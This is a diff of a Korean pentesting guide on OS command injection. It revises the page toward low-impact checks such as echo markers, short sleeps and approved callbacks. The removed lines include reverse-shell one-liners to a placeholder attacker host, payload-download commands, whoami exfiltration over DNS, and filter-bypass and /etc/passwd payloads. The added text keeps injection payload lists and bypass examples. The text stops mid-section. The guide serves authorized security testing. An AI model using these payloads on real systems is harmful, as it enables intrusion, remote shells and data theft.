@@ -1,51 +1,34 @@
 ---
 sidebar_position: 12
-title: 운영체제 명령어 삽입 (OS Command Injection)
-description: 웹 진단 - OS Command Injection 점검 절차, In-band/Blind/OOB 페이로드, commix 활용, 보고서 양식
-keywords: [Command Injection, OS Command, RCE, Blind, OOB, Out-of-Band, commix, Burp Collaborator, OWASP A05]
+title: OS Command Injection
+description: 웹 진단 - OS Command Injection 컨텍스트 판단, 메타문자, Blind/OOB 확인, 우회 노트
+keywords: [Command Injection, OS Command, RCE, Blind, OOB, 입력값 검증, OWASP A05]
 draft: false
 ---
 
 # 운영체제 명령어 삽입 (OS Command Injection)
 
-> 사용자 입력이 OS 명령어 실행 함수로 전달되어, 공격자가 **임의의 OS 명령을 실행**할 수 있는 취약점.
-> 발현 즉시 **RCE(Remote Code Execution)** 로 직결되며, 사실상 단일 결함만으로도 시스템 전체가 침해 가능한 최상위 위험.
-
-## 점검 개요
-
-| 항목 | 내용 |
-| :--- | :--- |
-| **분류** | OWASP A05:2025 - Injection / KISA 입력값 검증 |
-| **CWE** | [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html) |
-| **영향도** | 🔴 매우 높음 (즉시 RCE → 시스템 전반 침해) |
-| **점검 난이도** | 하 (직접 출력형) / 최상 (Blind + WAF + 비대화형 환경) |
-| **예상 점검 시간** | 파라미터당 20분 ~ 4시간 (Blind/OOB는 시간 소요 큼) |
-
----
-
 ## 점검 목적
 
-사용자 입력이 **셸 명령어 문자열에 그대로 결합**되어 시스템 호출 함수(`system()`, `exec()`, `Runtime.exec()`, `subprocess.Popen(shell=True)` 등)로 흘러가는지 확인한다. 성공 시 **임의 OS 명령 실행**, 즉 RCE가 발생하며, 이는 곧 **시스템 내 모든 파일 접근, 내부망 피벗팅, 클라우드 메타데이터 탈취, 권한 상승**으로 이어질 수 있다.
-
----
+사용자 입력값이 OS Command 실행 함수나 외부 바이너리 인자에 안전하게 분리되지 않은 채 들어가는지 확인. 성공 시 서버 권한으로 명령 실행, 파일 접근, 내부 시스템 접근, 서비스 장애 유발이 가능함. 운영 환경에서는 `echo` 마커, 사용자/호스트 확인, 짧은 지연 payload처럼 영향이 낮은 증거부터 확인.
 
 ## 유형 구분
 
-| 유형 | 특징 | 판정 방법 |
+| 유형 | 특징 | 실무 판단 |
 | :--- | :--- | :--- |
-| **In-band (직접 출력형)** | 명령 결과가 응답에 그대로 노출됨 | 응답 본문에서 `id`/`whoami` 출력 직접 확인 |
-| **Blind (Time-based)** | 응답 내용은 동일, 명령 실행 흔적 없음 | `sleep N` / `ping -c N` 으로 응답 지연 측정 |
-| **Out-of-Band (OOB)** | 응답에도, 시간에도 흔적이 없을 때 사용 | DNS/HTTP 콜백 (Burp Collaborator) 수신 확인 |
+| **In-band** | 명령 실행 결과가 응답/로그에 직접 노출 | `echo`, `whoami`, `hostname` 결과가 응답에 섞이는지 확인 |
+| **Blind Time-based** | 응답 내용은 같고 실행 여부를 시간으로만 판단 | baseline 대비 지연이 반복적으로 재현되는지 확인 |
+| **Out-of-Band (OOB)** | DNS/HTTP 콜백으로 실행 여부 확인 | 사전 승인된 Collaborator/interactsh에서 마커 콜백 수신 여부 확인 |
+| **Argument Injection** | 셸 메타문자는 안 먹지만 입력값이 외부 명령 옵션으로 해석 | `--help`, `--version` 같은 안전한 옵션 반영 여부 확인 |
 
-> 운영 환경 점검 시 우선순위는 **In-band → Time-based → OOB** 순으로 시도. OOB는 외부 통신이 차단된 망에서는 동작하지 않으므로, 망 구성을 먼저 확인할 것.
+### OS별 메타문자
 
-### OS별 명령어 연산자
-
-| OS | 사용 가능한 연산자 | 비고 |
+| 환경 | 먼저 볼 문자 | 실무 판단 |
 | :--- | :--- | :--- |
-| **Linux/Unix** | `;`, `&&`, `\|\|`, `\|`, `&`, `` ` ` ``, `$()`, 줄바꿈(`%0a`) | 셸(`sh`, `bash`, `zsh`)에 따라 일부 차이 |
-| **Windows (cmd)** | `&`, `&&`, `\|\|`, `\|` | `;` 미동작. PowerShell은 `;` 동작 |
-| **Windows (PowerShell)** | `;`, `\|`, `&` (호출 연산자) | `Invoke-Expression` 호출 시 별도 위험 |
+| Linux/Unix shell | `;`, `&&`, `\|`, `$()`, backtick, `%0a` | `sh -c`, `bash -c`로 문자열이 붙는지 확인 |
+| Windows cmd | `&`, `&&`, `\|` | `;`는 보통 동작하지 않음 |
+| PowerShell | `;`, `&`, `\|` | PowerShell 호출 여부가 보일 때만 확인 |
+| 셸 미사용 실행 | 메타문자보다 옵션값 | `Runtime.exec([...])`, `subprocess.run([...])` 형태면 Argument Injection을 봄 |
 
 ---
 
@@ -53,443 +36,373 @@ draft: false
 
 ### Step 1. 진입점 식별
 
-OS 명령 호출이 의심되는 **기능 단위**를 우선 후보로 잡는다 (단순 파라미터 fuzz보다 효율적):
+단순 파라미터 fuzz보다 OS 명령 호출 가능성이 높은 기능을 먼저 본다.
 
-- **네트워크 도구**: ping, traceroute, nslookup, whois 진단 폼
-- **파일 변환 / 처리**: 이미지 리사이즈(ImageMagick), PDF 변환, Office → PDF, 동영상 트랜스코딩
-- **압축 / 해제**: ZIP/TAR 업로드 후 자동 해제
-- **백업 / 다운로드**: 로그 다운로드, DB 덤프, 백업 파일 생성
-- **외부 URL fetch**: URL 입력 후 서버에서 받아오는 기능 (curl/wget 호출 가능성)
-- **파일명 / 메타데이터**: 업로드된 파일명이 셸로 그대로 흘러가는 경우 (특히 ImageMagick `-write` 등)
+- 네트워크 진단: ping, traceroute, nslookup, whois, curl 테스트
+- 파일 변환/처리: 이미지 리사이즈, PDF 변환, Office 변환, 동영상 트랜스코딩
+- 압축/해제: ZIP/TAR 업로드 후 자동 해제, 백업 생성
+- 외부 URL fetch: URL 미리보기, webhook 테스트, 원격 파일 다운로드
+- 파일명/메타데이터: 업로드 파일명, 압축 내부 파일명, EXIF/문서 메타데이터
+- 관리자 도구: 로그 조회, 백업, 배치 실행, 서버 상태 진단
 
-### Step 2. 1차 탐지 — 메타문자 주입
+### Step 2. Command Injection 진단 루틴
 
-기존 정상 입력값 뒤에 메타문자 + 짧은 명령을 붙여 응답 변화 확인:
+Burp Repeater에서 정상 입력을 baseline으로 고정한 뒤, **메타문자 확인 → 출력 확인 → 지연 확인 → 승인된 OOB 확인** 순서로 좁힌다.
 
-```
-127.0.0.1; id
-127.0.0.1 && id
-127.0.0.1 | id
-127.0.0.1`id`
-127.0.0.1$(id)
-127.0.0.1%0aid
-```
+**1. 메타문자/명령 분리 확인**
 
-응답에 `uid=...` 또는 시스템 정보가 노출되면 → **In-band 확정**.
+먼저 영향이 낮은 `echo` 마커로 명령이 분리 실행되는지 본다.
 
-### Step 3. Blind 판정 (시간 기반)
-
-응답이 동일하거나 결과 출력이 없을 때, **응답 지연**으로 실행 여부 확인:
-
-```
-127.0.0.1; sleep 10
-127.0.0.1 && sleep 10
-127.0.0.1 & ping -c 10 127.0.0.1     # Linux
-127.0.0.1 & ping -n 11 127.0.0.1     # Windows (-n 11 ≈ 10초)
+```text
+127.0.0.1;echo ci_test
+127.0.0.1&&echo ci_test
+127.0.0.1|echo ci_test
+127.0.0.1$(echo ci_test)
+127.0.0.1%0aecho ci_test
 ```
 
-페이로드의 N과 응답 지연이 **선형 비례**(N=5 → 5초, N=10 → 10초)하면 → **Blind 확정**.
+Windows 후보는 `&`를 먼저 본다.
 
-> 캐싱·CDN·DB 락 등 네트워크/애플리케이션 자체 지연과 혼동하지 않도록 **3회 이상 반복 측정** + **N 값을 바꿔가며 비교**.
-
-### Step 4. OOB 판정 (DNS/HTTP 콜백)
-
-응답에도, 시간에도 흔적이 없을 때 (예: 비동기 큐로 처리되는 작업):
-
-```
-127.0.0.1; nslookup abc123.<COLLAB>.oastify.com
-127.0.0.1; curl http://abc123.<COLLAB>.oastify.com
-127.0.0.1; ping -c 1 `whoami`.<COLLAB>.oastify.com
+```text
+127.0.0.1&echo ci_test
+127.0.0.1&&echo ci_test
+127.0.0.1|echo ci_test
 ```
 
-Burp Collaborator(또는 interactsh) 에서 **DNS/HTTP 요청이 수신**되고, 명령 결과(예: `whoami` 값)가 호스트명에 포함되어 들어오면 → **OOB 확정 + 데이터 추출 가능**.
+**2. 실행 결과 확인**
 
-### Step 5. OS / Shell 식별
+마커가 응답에 보이면 OS 식별용 최소 명령으로 전환한다.
 
-In-band가 잡히면 OS와 사용 가능한 인터프리터를 확인:
-
+```text
+;whoami
+;hostname
+;id
+& whoami
+& hostname
+& ver
 ```
-; uname -a                  # Linux
-; cat /etc/os-release       # Linux 배포판
-& systeminfo                # Windows
-& ver                       # Windows
-; which python python3 perl php node bash sh   # 사용 가능한 인터프리터
+
+**3. Time 비교**
+
+출력이 없을 때만 짧은 지연으로 본다.
+
+```text
+;sleep 3
+&& sleep 3
+;ping -c 3 127.0.0.1
+& ping -n 4 127.0.0.1
 ```
 
-이 정보로 다음 단계의 페이로드(특히 리버스 쉘) 유형이 결정된다.
+**4. OOB 확인**
 
-### Step 6. 영향 입증
+응답/시간으로 판단이 안 되고 외부 콜백 사용이 승인된 경우에만 본다.
 
-단순 `id`/`whoami` 가 아니라 **실제 위협 입증**:
+```text
+;nslookup ci-<RANDOM>.<COLLAB>.oastify.com
+;curl http://ci-<RANDOM>.<COLLAB>.oastify.com
+& nslookup ci-<RANDOM>.<COLLAB>.oastify.com
+```
 
-- 시스템 정보 + 권한 (`id`, `hostname`, `cat /etc/passwd | head`)
-- 환경변수 / 설정 파일 (앱 환경변수, AWS 키 노출 여부)
-- 클라우드 메타데이터 접근 가능 여부 (`curl http://169.254.169.254/...`)
-- 사전 협의된 경우에 한해 **리버스 쉘** 시도
+| 관찰 결과 | 바로 판단 | 다음 행동 |
+| :--- | :--- | :--- |
+| 응답에 `ci_test`가 섞임 | In-band 후보 | `whoami`, `hostname`으로 실행 권한 확인 |
+| 응답에 `uid=`, 사용자명, 호스트명이 보임 | Command Injection 확정 | 최소 증거 캡처 후 영향 범위 확인 |
+| 출력은 없고 지연만 재현됨 | Blind 후보 | baseline/False/True 지연을 반복 비교 |
+| Collaborator에 마커 콜백 수신 | OOB 후보 | 요청 시간, source IP, unique marker를 같이 기록 |
+| 메타문자는 실패, `--help`는 반영 | Argument Injection 후보 | 호출되는 바이너리와 위험 옵션 여부 확인 |
+| 특수문자만 500 발생 | 단순 예외 가능성 | stderr 노출, 필터 차단, 타입 검증 여부 분리 |
+
+### Step 3. 컨텍스트별 빠른 선택
+
+입력값이 어떤 명령 위치에 들어갈지 먼저 가정하고 payload를 고른다.
+
+| 입력 컨텍스트 | 먼저 넣을 값 | 볼 것 |
+| :--- | :--- | :--- |
+| Ping host: `host=127.0.0.1` | `127.0.0.1;echo ci_test` | ping 결과 뒤에 마커가 붙는지 |
+| Windows 진단: `host=127.0.0.1` | `127.0.0.1&echo ci_test` | cmd 계열 연산자가 먹는지 |
+| URL fetch: `url=http://...` | `http://example.com;echo ci_test` | URL 검증 전/후 어느 단계에서 막히는지 |
+| 파일명 | `test.jpg;echo ci_test` | 변환 로그, 미리보기, 관리자 처리 화면에 출력되는지 |
+| 압축 내부 파일명 | `a;echo ci_test.txt` | 압축 해제/검사/변환 과정에서 실행되는지 |
+| 옵션 위치 | `--help`, `--version` | 입력값이 명령 옵션으로 해석되는지 |
+| 비동기 작업 | `;sleep 3` 또는 승인된 OOB 마커 | 즉시 응답이 아니라 처리 완료 시점 영향 |
+
+### Step 4. OS / Shell 식별
+
+취약 가능성이 보이면 운영 영향이 낮은 명령으로 환경만 식별한다.
+
+| 환경 | 확인 값 | 판단 |
+| :--- | :--- | :--- |
+| Linux/Unix | `;id`, `;whoami`, `;hostname`, `;uname -s` | 웹서버 사용자, 컨테이너/호스트 단서 확인 |
+| Windows cmd | `& whoami`, `& hostname`, `& ver` | IIS AppPool, 서비스 계정, Windows 버전 확인 |
+| PowerShell | `; whoami`, `; $PSVersionTable.PSVersion` | PowerShell이 실제 인터프리터인지 확인 |
+| 셸 없음 | `--help`, `--version` | 외부 바이너리 옵션으로만 해석되는지 확인 |
+
+### Step 5. 영향 확인
+
+취약 확정에는 인터랙티브 셸이나 대량 파일 조회보다 **최소 증거**가 좋다.
+
+- In-band: `echo ci_test`, `whoami`, `hostname`이 응답에 노출되는지 확인
+- Blind: `sleep 0/3` 또는 baseline/지연 payload가 반복적으로 갈리는지 확인
+- OOB: unique marker, 요청 시간, 수신 protocol, source IP를 함께 기록
+- Argument Injection: 안전한 옵션이 반영되는지와 호출 바이너리 종류를 확인
+- 관리자 기능: 관리자 권한이 필요한 기능인지, 일반 사용자도 접근 가능한지 분리
 
 ---
 
-## 페이로드 / 테스트 케이스
+## 페이로드 노트
 
-### 케이스 1: In-band 기본 탐지
+아래 payload는 컨텍스트가 잡혔을 때 사용한다. 운영 환경에서는 짧고 가벼운 명령부터 확인하고, 파일 조회/외부 통신/장시간 지연은 사전 협의 범위에서만 사용한다.
 
-**언제 쓰는지**: 입력값 처리 결과가 응답에 그대로 출력되는 기능 (ping 결과 화면, 변환 로그 출력 등).
+### 메타문자 / 명령 분리
 
-```
-; id
-&& id
-| id
-`id`
-$(id)
-%0aid
-```
+정상 입력 뒤에 명령 구분자를 붙여 셸 문자열로 이어지는지 확인한다.
 
-**판정**: 응답에 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 같은 출력이 보이면 취약.
-
-> 일부 환경은 stdout만 응답에 노출하고 stderr는 버린다. 출력이 없으면 `2>&1`을 붙여 stderr까지 묶어 본다: `; id 2>&1`.
-
-### 케이스 2: Time-based Blind
-
-**언제 쓰는지**: 메타문자는 들어가는데 결과 출력이 없을 때, 또는 응답이 항상 동일할 때.
-
-```
-; sleep 10
-&& sleep 10
-| sleep 10
-& ping -c 10 127.0.0.1                         # Linux
-& ping -n 11 127.0.0.1                         # Windows
-; perl -e "sleep(10)"                          # sleep 차단 시
-; python3 -c "import time;time.sleep(10)"      # 동일
+```text
+127.0.0.1;echo ci_test
+127.0.0.1&&echo ci_test
+127.0.0.1|echo ci_test
+127.0.0.1$(echo ci_test)
+127.0.0.1%0aecho ci_test
 ```
 
-**판정**: 같은 요청을 sleep 0/5/10으로 바꿔가며 보냈을 때 응답 시간이 0초/5초/10초로 비례하면 취약.
+Windows는 `;`보다 `&` 계열을 먼저 본다.
 
-### 케이스 3: Out-of-Band (OOB) 탐지
-
-**언제 쓰는지**: Blind도 잡히지 않거나, 비동기 작업(업로드 후 백그라운드 처리 등)으로 응답에 결과가 없는 경우. **외부 인터넷 통신이 가능한 환경에서만** 동작.
-
-```
-; nslookup <RANDOM>.<COLLAB>.oastify.com
-; curl http://<RANDOM>.<COLLAB>.oastify.com
-; wget http://<RANDOM>.<COLLAB>.oastify.com
-
-# 명령 결과를 호스트명에 실어 외부로 추출
-; nslookup `whoami`.<COLLAB>.oastify.com
-; curl http://`hostname`.<COLLAB>.oastify.com
-; ping -c 1 $(whoami | base64).<COLLAB>.oastify.com
+```text
+127.0.0.1&echo ci_test
+127.0.0.1&&echo ci_test
+127.0.0.1|echo ci_test
 ```
 
-**판정**: Burp Collaborator(또는 interactsh) 에서 DNS/HTTP 요청이 수신되면 RCE 확정. 호스트명 prefix에 `whoami`/`hostname` 결과가 포함되어 들어오면 데이터 추출까지 가능함을 입증.
+`echo ci_test`가 응답, 변환 로그, 관리자 화면에 보이면 명령 분리가 된 것으로 본다.
 
-### 케이스 4: 공백 차단 우회
+### In-band 출력 확인
 
-**언제 쓰는지**: 입력값에서 공백(` `)이 차단·변환되어 명령 인자가 실행되지 않을 때.
+마커가 잡힌 뒤에만 OS 식별용 최소 명령으로 넘어간다.
 
-```
-# ${IFS} (Internal Field Separator) — 공백 대체
-;cat${IFS}/etc/passwd
-;{cat,/etc/passwd}                  # Brace expansion (bash)
-;cat</etc/passwd                    # 입력 리다이렉션
-;cat$IFS$9/etc/passwd
-
-# Tab(%09) / Newline(%0a) — URL 인코딩 후 전송
-;cat%09/etc/passwd
-;cat%0a/etc/passwd
-```
-
-**판정**: 동일 페이로드에서 단순 공백은 차단되는데 위 우회는 동작하면 → **공백 필터만 있고 메타문자 자체는 통과** = 취약.
-
-### 케이스 5: 키워드 / 명령어 차단 우회
-
-**언제 쓰는지**: `cat`, `whoami` 등 특정 키워드가 블랙리스트로 차단된 경우.
-
-```
-# 따옴표 분리 — 셸은 따옴표를 무시하고 키워드 매칭은 회피
-;w""ho""ami
-;c'a't /etc/passwd
-
-# 백슬래시 분리
-;wh\oami
-;c\at /etc/passwd
-
-# 변수 결합
-;a=who;b=ami;$a$b
-;CMD=whoami;$CMD
-
-# 와일드카드로 경로 재구성
-;/usr/bin/whoa*
-;/???/??t /etc/passwd               # /bin/cat /etc/passwd
-
-# Base64 디코드 후 실행
-;echo d2hvYW1p|base64 -d|sh
-;`echo d2hvYW1p|base64 -d`
-```
-
-**판정**: 원본 키워드가 차단되는데 위 우회 페이로드로 동일 동작이 확인되면 → **블랙리스트 방어만 적용** = 취약.
-
-### 케이스 6: Windows 환경
-
-**언제 쓰는지**: 대상이 Windows IIS / .NET 등으로 식별되었을 때 (Linux 페이로드는 동작하지 않음).
-
-```
+```text
+;whoami
+;hostname
+;id
+;uname -s
 & whoami
-&& whoami
-| whoami
-& dir C:\
-& systeminfo
-& type C:\Windows\win.ini
-& certutil -urlcache -split -f http://<ATTACKER>/payload.exe payload.exe
+& hostname
+& ver
 ```
 
-PowerShell이 호출되는 환경:
+stdout만 노출되고 stderr는 버려지는 경우가 있다. 오류만 의심될 때는 제한적으로 stderr 병합을 확인한다.
 
+```text
+;id 2>&1
+& whoami 2>&1
 ```
-; whoami
-; Get-Process
-; Invoke-WebRequest http://<ATTACKER>/payload.ps1 -OutFile p.ps1
+
+### Blind Time-based
+
+결과 출력이 없을 때 사용한다. 네트워크 지연과 섞이지 않게 짧게 시작한다.
+
+```text
+;sleep 3
+&& sleep 3
+;sleep 0
+;ping -c 3 127.0.0.1
+& ping -n 4 127.0.0.1
 ```
 
-**판정**: `nt authority\system`, `iis apppool\<...>` 등 Windows 사용자명이 응답에 출력되면 취약.
+판정은 한 번의 지연이 아니라 **baseline 정상 / False 비지연 / True 지연** 조합이 반복될 때 한다.
 
-### 케이스 7: 영향 입증 — 리버스 쉘
+### OOB 확인
 
-> ⚠️ **실무 주의**: 운영 환경 리버스 쉘 시도는 **반드시 사전 서면 협의**. 가능하면 점검계 또는 격리망 내 수신 서버로만 연결. PoC는 보통 `id`/`hostname` + `/etc/passwd` 일부 캡처 정도로 마무리.
+비동기 처리이거나 출력/지연으로 판단이 어려울 때만 사용한다. 외부 통신 로그가 고객사 보안 장비에 남을 수 있으므로 사전 승인된 도메인만 쓴다.
 
-**Bash (Linux):**
+```text
+;nslookup ci-<RANDOM>.<COLLAB>.oastify.com
+;curl http://ci-<RANDOM>.<COLLAB>.oastify.com
+& nslookup ci-<RANDOM>.<COLLAB>.oastify.com
+```
+
+콜백이 오면 payload별 unique marker, 요청 시각, 기능명, source IP를 같이 기록한다. 명령 결과를 외부 도메인에 싣는 방식은 운영 진단에서 기본 사용하지 않는다.
+
+### Argument Injection
+
+셸 메타문자가 안 먹어도 입력값이 외부 명령의 옵션으로 들어가면 별도 취약점이 될 수 있다. 먼저 안전한 옵션이 반영되는지 본다.
+
+```text
+--help
+--version
+-h
+-V
+```
+
+| 호출 가능성이 있는 도구 | 안전 확인 값 | 볼 것 |
+| :--- | :--- | :--- |
+| `curl` / `wget` | `--version`, `--help` | 도움말/버전 문자열이 응답이나 로그에 나오는지 |
+| ImageMagick | `-version`, `-help` | 변환 결과 대신 도구 출력이 노출되는지 |
+| `tar` / `zip` | `--version`, `--help` | 압축 처리 오류가 옵션 기준으로 바뀌는지 |
+| `ffmpeg` | `-version`, `-h` | 인코딩 로그에 옵션 출력이 섞이는지 |
+
+안전 옵션이 반영되면 호출 바이너리와 위험 옵션을 따로 분석한다. 바로 실행형 옵션이나 파일 쓰기 옵션으로 넘어가지 않는다.
+
+### 파일명 / 업로드 처리
+
+파일명은 저장 시점보다 변환/미리보기/압축 해제/백신 검사 같은 후처리에서 발현되는 경우가 많다.
+
+```text
+test.jpg;echo ci_test
+test.jpg&&echo ci_test
+test$(echo ci_test).jpg
+test%0aecho%20ci_test.jpg
+```
+
+확인은 업로드 응답만 보지 말고 썸네일 생성, 상세 보기, 관리자 검수, 다운로드, 변환 로그까지 이어서 본다.
+
+### 필터 우회
+
+필터가 보이면 차단된 문자를 기준으로 좁혀간다.
+
+| 필터 증상 | 우회 방향 | 예시 |
+| :--- | :--- | :--- |
+| `;` 차단 | `&&`, pipe, newline | `&&echo ci_test`, `%0aecho ci_test` |
+| 공백 차단 | `${IFS}`, tab, brace expansion | `echo${IFS}ci_test`, `echo%09ci_test` |
+| 명령어 키워드 차단 | quote 분리, 변수 결합 | `w"h"oami`, `a=who;b=ami;$a$b` |
+| 괄호 차단 | 단순 구분자 우선 | `;echo ci_test`, `&&echo ci_test` |
+| URL 인코딩 이슈 | 한 번/두 번 인코딩 비교 | `%3b`, `%253b`, `%26`, `%0a` |
+| 출력 없음 | stderr 병합, time-based | `2>&1`, `sleep 3` |
+| Linux payload 실패 | Windows 연산자 확인 | `& whoami`, `& hostname` |
+| 메타문자 전부 실패 | Argument Injection 확인 | `--help`, `--version` |
+
+---
+
+## 자동화 도구 참고
+
+실무 운영 점검에서는 고객사 가용성 문제와 요청량/페이로드 변형을 점검자가 세밀하게 통제하기 어려운 이슈 때문에 commix 같은 자동화 도구를 기본 사용하지 않는다. 랩 환경이나 사전 승인된 제한 검증에서 참고하는 정도로만 둔다.
+
+사용하더라도 Burp 요청 파일 기준으로 대상 파라미터와 기법을 좁힌다.
 
 ```bash
-; bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1
-; bash -c 'bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1'
+commix -r request.txt -p host --batch --technique=classic
+commix -r request.txt -p host --batch --technique=time
 ```
 
-**Python (Linux/Windows 모두):**
+아래 옵션은 운영 환경에서는 사용하지 않는 쪽으로 본다.
 
 ```bash
-; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+--os-shell
+--os-pwn
+--reverse-tcp
+--alter-shell
 ```
 
-**PHP:**
-
-```bash
-; php -r '$sock=fsockopen("<ATTACKER>",<PORT>);exec("sh <&3 >&3 2>&3");'
-```
-
-**mkfifo + nc (nc -e 옵션 차단 시):**
-
-```bash
-; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER> <PORT> >/tmp/f
-```
-
-**Windows PowerShell:**
-
-```powershell
-; powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
-```
-
-**판정**: 공격자 측 `nc -lvnp <PORT>` 리스너에 셸이 붙으면 RCE 입증 완료.
-
-### 케이스 8: 자동화 — commix
-
-**언제 쓰는지**: 수동으로 in-band/Blind 가능성을 확인한 뒤, 페이로드 변형 / OS 식별 / 데이터 추출까지 한번에 자동화하고 싶을 때.
-
-```bash
-# GET 파라미터
-commix --url="https://<TARGET>/ping?host=127.0.0.1" --batch
-
-# POST 파라미터
-commix --url="https://<TARGET>/ping" --data="host=127.0.0.1" --batch
-
-# 쿠키 + 인증 세션
-commix --url="https://<TARGET>/admin/diag?host=127.0.0.1" \
-  --cookie="SESSION=abcd1234" --batch
-
-# Burp 요청 파일 그대로 사용
-commix -r request.txt --batch
-
-# 특정 기법만 시도 (classic / eval / file-based / time-based / tempfile-based)
-commix --url="..." --technique=t --batch          # time-based만
-
-# 셸 진입까지 자동화
-commix --url="..." --os-shell
-```
-
-> ⚠️ **실무 주의**: commix는 페이로드를 다수 시도하므로 운영망에서는 **요청 수 / 부하**가 크게 발생. 사전 협의 + `--threads 1` + 시간대 협의(점검 윈도우) 권장. `--os-shell`, `--os-pwn` 같은 인터랙티브 옵션은 운영 환경에서 사용 금지.
+자동화 결과는 최종 판정 근거가 아니라 수동 재현을 돕는 참고 자료로만 본다.
 
 ---
 
 ## 취약 판정 기준
 
-다음 중 **하나라도** 해당하면 취약:
+다음 중 하나라도 안정적으로 재현되면 취약으로 본다.
 
-- [ ] 메타문자(`;`, `|`, `&&`, 백틱, `$()`, `%0a`) 삽입 시 응답에 **명령 실행 결과**(예: `uid=...`, `nt authority\...`) 가 노출됨
-- [ ] `sleep N` / `ping -c N` 페이로드에서 **응답 지연이 N과 비례**하여 발생 (3회 이상 재현)
-- [ ] OOB 페이로드(`nslookup`/`curl <COLLAB>`) 에서 **DNS 또는 HTTP 콜백이 수신**됨
-- [ ] commix가 인젝션을 확인하고 OS/사용자/셸 정보를 자동 추출 성공
+- [ ] 입력값 뒤에 붙인 `echo ci_test`가 응답, 로그, 관리자 화면에 출력됨
+- [ ] `whoami`, `hostname`, `id` 같은 최소 명령 결과가 서버 권한으로 노출됨
+- [ ] 지연 payload에서 baseline 대비 일정 시간 이상 지연이 반복 재현됨
+- [ ] 승인된 OOB 도메인으로 unique marker 콜백이 수신됨
+- [ ] 셸 메타문자는 실패해도 입력값이 외부 바이너리 옵션으로 해석됨
 
-**오탐 주의 (다음은 Command Injection 아님 또는 별도 결함):**
+다음은 후보 또는 보류로 둔다.
 
-- [ ] 단순 500 오류만 발생하고 명령 실행 흔적 없음 (입력 검증으로 인한 어플리케이션 오류일 수 있음)
-- [ ] 응답 지연이 페이로드 N과 무관하게 일정 (DB 쿼리/외부 API 지연일 가능성)
-- [ ] 외부 통신 자체가 모든 입력에서 발생 (대상 기능이 정상적으로 외부 호출하는 경우 — SSRF로 분류 검토)
-- [ ] OOB 콜백이 페이로드 없이도 수신됨 (앱이 정상적으로 외부 호출하는 정상 동작)
+- [ ] 특수문자 하나로 500 오류만 발생하고 명령 결과/지연/OOB가 없음
+- [ ] 응답 지연이 payload와 무관하게 흔들림
+- [ ] OOB 콜백이 payload 없이도 발생함
+- [ ] 입력값이 URL 검증, JSON 스키마, 파일 확장자 검증에서만 차단됨
+- [ ] 클라이언트에서만 검증/변환되고 서버 처리에 영향이 없음
 
----
+영향도가 올라가는 조건:
 
-## PoC 양식 (보고서 붙여넣기용)
-
-**[OS Command Injection - In-band] - 네트워크 진단 페이지 `host` 파라미터**
-
-1. `<TARGET>/admin/diag/ping` 페이지에 관리자로 로그인 후 접근
-2. `host` 파라미터 정상값(`127.0.0.1`) 으로 ping 결과 노출 확인
-3. `host` 파라미터에 아래 페이로드를 삽입
-4. 응답 본문에 `id` 명령 실행 결과 노출 확인
-
-**요청 (Request):**
-
-```http
-POST /admin/diag/ping HTTP/1.1
-Host: <TARGET>
-Cookie: SESSION=abcd1234
-Content-Type: application/x-www-form-urlencoded
-
-host=127.0.0.1%3B+id
-```
-
-**응답 (Response) — 취약 발현 증거:**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html; charset=utf-8
-
-<html>
-  ...
-  <pre>
-  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
-  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms
-
-  --- 127.0.0.1 ping statistics ---
-  1 packets transmitted, 1 received, 0% packet loss, time 0ms
-  rtt min/avg/max/mdev = 0.024/0.024/0.024/0.000 ms
-  uid=33(www-data) gid=33(www-data) groups=33(www-data)
-  </pre>
-  ...
-</html>
-```
-
-**확인 사항:**
-- 응답 본문에 `uid=33(www-data)` 가 출력되어, 입력값이 셸 명령으로 실행되었음이 확인됨
-- 동일 패턴으로 `cat /etc/passwd`, `hostname`, `cat /proc/self/environ` 등 임의 명령 실행 가능
-- 사전 협의 후 격리망 내 리스너로 리버스 쉘 연결 시도 시 셸 획득됨 (별첨 스크린샷)
+- [ ] 일반 사용자 권한으로 관리자 진단 기능 호출 가능
+- [ ] 웹서버 계정 권한이 높거나 컨테이너 탈출 단서가 있음
+- [ ] 파일 변환/배치/압축 해제처럼 비동기 후처리에서 실행됨
+- [ ] 내부망 통신 또는 민감 설정 접근 가능성이 확인됨
 
 ---
 
-## 영향도 분석
+## 블라인드 모의해킹 확장
 
-- **기밀성 (Confidentiality)**: 🔴 **매우 높음** — 어플리케이션 권한으로 접근 가능한 모든 파일(설정, 인증서, DB 자격증명, AWS 키 등) 노출.
-- **무결성 (Integrity)**: 🔴 **매우 높음** — 파일 생성/수정/삭제, 웹쉘 업로드, 어플리케이션 코드 변조 가능.
-- **가용성 (Availability)**: 🔴 **높음** — 서비스 종료(`kill`, `shutdown`), 디스크 채우기, 핵심 파일 삭제로 즉시 장애 유발 가능.
-- **추가 위협**:
-  - **내부망 피벗팅** — 외부 노출이 안 된 내부 시스템으로 공격 확장
-  - **클라우드 메타데이터 접근** — `169.254.169.254/latest/meta-data/iam/security-credentials/` 로 IAM 임시 자격증명 탈취
-  - **권한 상승** — SUID 바이너리, sudo 설정, 커널 익스플로잇 등으로 root 획득
-  - **지속성 확보** — cron, systemd, SSH 인증키 추가로 장기 침투
+취약점 진단에서는 `echo`, `whoami`, 짧은 지연으로 멈추지만, 블라인드 모의해킹에서는 **실행 권한, 시스템 경계, credential 접근, 내부 접근성**까지 확인한다.
 
-**비즈니스 임팩트:**
